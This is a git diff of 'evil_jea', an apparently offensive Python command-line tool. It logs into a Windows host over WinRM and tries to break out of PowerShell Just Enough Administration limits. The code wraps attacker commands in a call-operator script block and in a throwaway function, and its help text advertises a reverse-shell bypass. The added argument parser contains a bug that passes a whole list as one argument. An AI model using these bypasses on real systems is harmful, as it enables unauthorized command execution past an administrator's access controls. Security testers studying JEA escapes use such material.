@@ -16,12 +16,17 @@ It can be used as a handy facility for running the task from a command line.
     `Read-The-Docs <http://luigi.readthedocs.io/en/stable/>`_ page.
 
 .. currentmodule:: evil_jea.cli
-.. moduleauthor:: Sasha Thomas <sthomas@securityinnovation.com>
+.. moduleauthor:: Sasha Thomas
 """
 import logging
 import click
+import re
 from pypsrp.powershell import PowerShell, RunspacePool
 from pypsrp.wsman import WSMan
+from pypsrp.client import Client
+from pypsrp.shell import Process, SignalCode, WinRS
+from pypsrp.wsman import WSMan
+from tabulate import tabulate
 from .__init__ import __version__
 
 LOGGING_LEVELS = {
@@ -80,6 +85,7 @@ ___________     .__.__                 ____.___________   _____
 help_text = """
 JEA Shell Commands:
     help                    Show list of available commands
+    info [command]          Show information about a command.
     call [command]          JEA bypass: Attempts to run [command] using call operator 
     function [command]      JEA bypass: Attempts to run [command] inside of a custom function
     rev_shell [ip] [port]   JEA bypass: Attempts to run PowerShell reverse shell inside of custom function
@@ -89,7 +95,8 @@ JEA Shell Commands:
 @click.argument('username')
 @click.argument('password')
 @click.argument('target')
-def connect(username, password, target):
+@click.option('--raw', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
+def connect(username, password, target, raw):
     """
     Connect to JEA target.
     
@@ -100,13 +107,13 @@ def connect(username, password, target):
         rev_shell   JEA bypass: Create new powershell reverse shell xyz
 
     """
-    commands = ["help", "call", "run", "function"]
+    commands = ["help", "call", "run", "function", "info"]
 
     wsman = WSMan(target, username=username,
               password=password, ssl=False,
               auth="negotiate",cert_validation=False)
     print("[+] Testing connection...")
-    test = run_command(wsman, "Get-Command")
+    test = run_command(wsman, "Get-Command", raw)
     if (test):
         print("[+] Connection succeeded. Available commands:")
         for result in test:
@@ -121,22 +128,24 @@ def connect(username, password, target):
             match root_command:
                 case "help":
                     print(help_text)
+                case "info":
+                    info_command = command.split()[1]
+                    info(wsman, info_command, raw)
                 case "call":
                     new = command.split()[1]
-                    for result in call_bypass(wsman, new):
+                    for result in call_bypass(wsman, new, raw):
                         print(result)
                 case "function":
                     new = command.split()[1]
-                    for result in function_bypass(wsman, new):
+                    for result in function_bypass(wsman, new, raw):
                         print(result)
                 case _:
                     print("JEA shell command not found!")
         
         else:
-            result = run_command(wsman, command)
+            result = run_command(wsman, command, raw)
             for output in result:
                 print(output)
-
 
 
 @cli.command()
@@ -144,17 +153,71 @@ def version():
     """Get the library version."""
     click.echo(click.style(f"{__version__}", bold=True))
 
-def run_command(wsman, command):
+def run_command(wsman, command, raw):
+    commands = re.findall(r'(?:[^\s"]|"(?:\\.|[^"])*")+', command)
     with RunspacePool(wsman) as pool:
         ps = PowerShell(pool)
-        ps.add_script(command)
+        if raw:
+            ps.add_script(command)
+        else:
+            args = []
+            params = []
+            seen = False
+            if len(commands) > 1:
+                for cmd in commands[1:]:
+                    if cmd.startswith("-"): 
+                        params.append(cmd[1:])
+                        seen = True
+                        continue
+                    else:
+                        if seen:
+                            params.append(cmd)
+                            seen = False
+                        else:
+                            args.append(cmd)
+                ps.add_cmdlet(commands[0])
+                for arg in args:
+                    ps.add_argument(args)
+                for values in range(0, len(params), 2):
+                    param, value = params[values:values + 2]
+                    ps.add_parameter(param, value)
+            else: 
+                ps.add_cmdlet(command) 
         ps.invoke()
         return ps.output
 
-def call_bypass(wsman, command):
-    result = run_command(wsman, "&{ " + command + " }")
+def call_bypass(wsman, command, raw):
+    result = run_command(wsman, "&{ " + command + " }", raw)
     return result
 
-def function_bypass(wsman, command):
-    result = run_command(wsman, "function gl {" + command + "}; gl")
+def function_bypass(wsman, command, raw):
+    result = run_command(wsman, "function gl {" + command + "}; gl", raw)
     return result
+
+def info(wsman, command, raw):
+    result = run_command(wsman, 'Get-Command', raw)
+    results = []
+    for output in result:
+        #print("----------------------")
+        results.append([
+            output.adapted_properties.get("Name"), 
+            output.adapted_properties.get("CommandType"), 
+            output.adapted_properties.get("ScriptBlock")])
+    print(tabulate(results, headers=['Name', 'Type', 'Definition'], tablefmt="grid", maxcolwidths=[16, 8, None]))
+        #print(f"|f{output.adapted_properties.get('Name')}        |")
+        #print(output.adapted_properties.get("CommandType"))
+        #print(output.adapted_properties.get("ScriptBlock"))
+        #print(definitions)
+        #if definitions and command in definitions:
+        #    print(definitions)
+        #for param in output.adapted_properties:
+            #if output.adapted_properties.get("Name") == command:
+            #print(output.adap)
+            #print(output.adapted_properties[param])
+            #print(f"{param.get('Name')}")
+            #print(f"key: {param}")
+            #print("--------")
+            #print(f"value: {output.adapted_properties[param]}")
+            #print("--------")
+    #print("----------------------------------")
+
